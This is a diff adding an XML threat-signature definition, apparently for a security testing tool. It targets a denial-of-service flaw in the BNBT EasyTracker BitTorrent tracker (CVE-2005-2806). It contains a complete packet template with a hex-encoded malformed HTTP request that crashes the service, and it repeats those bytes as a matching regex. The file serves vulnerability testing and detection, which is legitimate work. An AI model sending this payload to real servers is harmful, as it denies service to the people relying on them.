@@ -1,0 +1,78 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="BNBT EasyTracker Denial of Service"/>
+    <EngDesc display="true" value="This threat sends a malformed HTTP request to the BNBT service, causing a denial of service. This can be used to prevent legitimate users from using the service.  BNBT is a BitTorrent tracker that typically listens on TCP port 6969."/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="Proprietary"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Trevor_Hogan"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Trevor_Hogan_BNBT"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Trevor_Hogan_BNBT_7.7r3"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://secway.org/advisory/AD20050830.txt"/>
+    <CVEID display="true" value="CVE-2005-2806"/>
+    <bugtraqID display="true" value="14700"/>
+    <OSVDB display="true" value="19069"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="242ca75748e8147db92161684a5820d0"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="true"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725865813125000"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X47\X45\X54\X20\X2F\X69\X6E\X64\X65\X78\X2E\X68\X74\X6D\X20\X48\X54\X54\X50\X2F\X31\X2E\X31\X0D\X0A\X3A\X0D\X0A\X0D\X0A"/>
+    <Created value="1155320287" display="true"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="ProprietarydestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$ProprietarydestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F696E6465782E68746D20485454502F312E310D0A3A0D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
